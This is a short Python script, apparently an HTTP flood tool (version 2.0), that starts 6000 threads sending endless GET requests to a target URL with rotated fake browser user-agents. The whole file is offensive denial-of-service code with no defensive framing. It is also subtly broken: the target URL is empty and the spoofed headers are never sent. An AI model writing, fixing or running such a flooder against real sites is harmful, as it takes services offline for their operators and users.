import requests
import random
import threading
import multiprocessing

VERSION='2.0'


url=''
socket_ip=[]
user_agent=[]
request_counters=0


def user_agents():
    user_agent.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    user_agent.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    user_agent.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')

def request_attack():
    random_agents=random.choice(user_agent)
    headers={'User-Agent':random_agents}
    requests.get(url)
    
def send():
    for i in range(6000):
        get_attack=threading.Thread(target=request_attack)
        get_attack.start()
    while True:
        if threading.active_count() < 6000:
            get_attack=threading.Thread(target=request_attack)
            get_attack.start()

user_agents()
send()
